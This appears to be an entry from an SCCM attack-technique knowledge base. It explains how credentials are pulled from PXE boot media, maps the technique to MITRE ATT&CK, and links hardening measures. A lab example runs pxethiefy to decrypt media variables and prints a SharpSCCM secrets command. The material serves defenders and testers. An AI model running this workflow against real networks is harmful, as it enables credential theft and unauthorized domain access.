# Retrieve secrets from PXE boot media
## Code Name
- CRED-1

## MITRE ATT&CK TTPs
- [TA0001](https://attack.mitre.org/tactics/TA0001) - Initial Access
- [TA0006](https://attack.mitre.org/tactics/TA0006) - Credential Access
- [T1078.002](https://attack.mitre.org/techniques/T1078/002/) - Valid Accounts: Domain Accounts

## Requirements
- Unauthenticated network access
- Line of sight to DHCP server
- Line of sight to PXE-enabled distrution point

## Summary
SCCM contains a preboot execution environment (PXE) feature which allows systems to load a specific operating system image on boot.

When PXE is configured, SCCM will make various [configuration changes](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot#pxe-service-point-installation) to the distribution point (DP). Most notably, the `PxeInstalled` and `IsPxe` values under the `HKLM\Software\Microsoft\SMS\DP` registry key are set to `1`.

The boot images are then [deployed](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot#add-boot-images-to-a-pxe-enabled-dp) from the site server to the DP's file system at `C:\RemoteInstall\`.

The three required components for PXE boot to work are: a PXE client, a DHCP server, and a PXE-enabled DP. A non-domain-joined computer (the PXE client in this case) that has network access could initiate the [DHCP process](https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences), resulting in the PXE client receiving a DHCPPACK request containing the `BootFileName` location and Windows Deployment Services (WDS) network boot program (NBP). Next, the client initiates a TFTP session to [download](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot#downloading-the-boot-files) the NBP. The NBP contains several files and and programs that are used to boot the computer into a Windows Preinstallation Environment (WinPE).

To Summarize this process, how PXE works in SCCM:
1. PXE client gets an IP from DHCP server​
2. Client sends new DHCPREQUEST to DP, DP responds with DHCPACK that contains the BootFileName​
3. Client starts TFTP session targeting the boot file​
4. Client downloads the network boot program (NBP)​
5. NBP downloads the operating system loader and boot files​
6. The WinPE image is loaded into a RAMDISK in memory​
7. WinPE boots, loading a task sequence (TS) boot shell, TS manager boot strap (TsPxe.dll)​
8. TS environment variables and a client certificate are downloaded via TFTP​
9. TSPXE locates the MP and downloads policy assignments​
10. Collection and machine variables are downloaded

**Note:** This goes beyond the scope of this article but Microsoft's [documentation](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot) covers it in more depth.

This process can be abused because the files and policies can be accessed without booting the PXE media. By initiating the DHCPDISCOVER request, an attacker can locate the PXE media on the network and check if they are password-protected. If they are protected, the hash can be retrieved and cracked offline using [hashcat](https://github.com/hashcat/hashcat) and [this custom module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module) from Christopher Panayi. If not protected, the cleartext data can be directly used. [PXEThief](https://github.com/MWR-CyberSec/PXEThief​) and [pxethiefy](https://github.com/csandker/pxethiefy​) both enable and trivialize this attack.

Once the media file is decrypted, it may contain credential material in the `NAAConfig` (network access account(NAA)), `TaskSequence`, and `CollectionSettings` (collection variables) policies.


## Impact

Attackers may recover domain credentials from this process, the difficulty of which is a direct function of the complexity of the password set on the PXE media file. If a weak password is set, cracking the password is relatively computionally "easy," depending on the hardware.

With these credentials, attackers may transition from an unauthenticated context on the network to a domain-authenticated context. If any of the credentials recovered are privileged, it may also enable privilege escalation and lateral movement vectors.

## Defensive IDs
- [PREVENT-3: Harden or Disable Network Access Account](../../../defense-techniques/PREVENT/PREVENT-3/prevent-3_description.md)
- [PREVENT-6: Configure strong PXE boot password](../../../defense-techniques/PREVENT/PREVENT-6/prevent-6_description.md)
- [PREVENT-7: Disable command support in PXE boot configuration](../../../defense-techniques/PREVENT/PREVENT-7/prevent-7_description.md)
- [PREVENT-21: Restrict PXE boot to authorized VLANs](../../../defense-techniques/PREVENT/PREVENT-21/prevent-21_description.md)


## Examples

- Using pxethiefy from a Linux machine with network access to retrieve a PXE media file with no password set
```
testsubject4@sphere4:~$ sudo python3 pxethiefy.py explore -i eth0 -a atlas.aperture.local
 
 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________ ___    ___ 
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\\  \  /  /|
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/\ \  \/  / /
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\\ \    / / 
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_| \/  /  /  
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\__/  / /    
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|\___/ /     
          |__|/ \|__|                                                     \|___|/      
                                                                                       v.0.0.2
                                                Based on the original PXEThief by MWR-CyberSec
                                                     https://github.com/MWR-CyberSec/PXEThief/

[*] Querying Distribution Point: atlas.aperture.local
[*] Sending DHCP request to fetch PXE boot files at: atlas.aperture.local
--- Scapy output ---
.
Sent 1 packets.
[*] Variables File Location: \SMSTemp\2023.10.13.16.48.53.0001.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.var
[*] BCD File Location: \SMSTemp\2023.10.13.16.48.53.07.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.bcd
[*] Downloading var file '\SMSTemp\2023.10.13.16.48.53.0001.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.var' from TFTP server 'atlas.aperture.local'
[+] Blank password on PXE media file found!
[*] Attempting to decrypt it...
[+] Media variables file to decrypt: 2023.10.13.16.48.53.0001.{23F3F1E7-6083-4BB7-97D3-C7B890BADB71}.boot.var
[+] Password bytes provided: 0xb4ff3000ceff90fffbff4c00ceff89ffdcff4800
[+] Successfully decrypted media variables file with the provided password!
[+] Management Point: http://atlas.aperture.local
[+] Site Code: PS1
[+] You can use the following information with SharpSCCM in an attempt to obtain secrets from the Management Point..
  SharpSCCM.exe get secrets -i "{d10d7f98-17dd-4588-b645-34964936023b}" -m "{5F8225E8-6B94-4830-AD90-0F88FC2B3536}" -c "3082073E020103308206FA06092A864886F70D010701A08206EB048206E7308206E33082

<SNIP>

6C458FCF53D0A6D2DBA446F1C0414FAD1E03A89D8481E26D7C1BED1E71FDC3272C701020207D0" -s -c PS1 -mp atlas.aperture.local
```

## References
- Christopher Panayi, Identifying and Retrieving Credentials From SCCM/MECM Task Sequences, https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences
- Christopher Panayi, Pulling Passwords Out of Configuration Manager, https://www.youtube.com/watch?v=Ly9goAud0gs
- Christopher Panayi, PXEThief, https://github.com/MWR-CyberSec/PXEThief
- Christopher Panayi, AES-128 ConfigMgr CryptDeriveKey Hashcat Module, https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
- Carsten Sandker, pxethiefy, https://github.com/csandker/pxethiefy​
- Microsoft, Understanding PXE Boot, https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/os-deployment/understand-pxe-boot
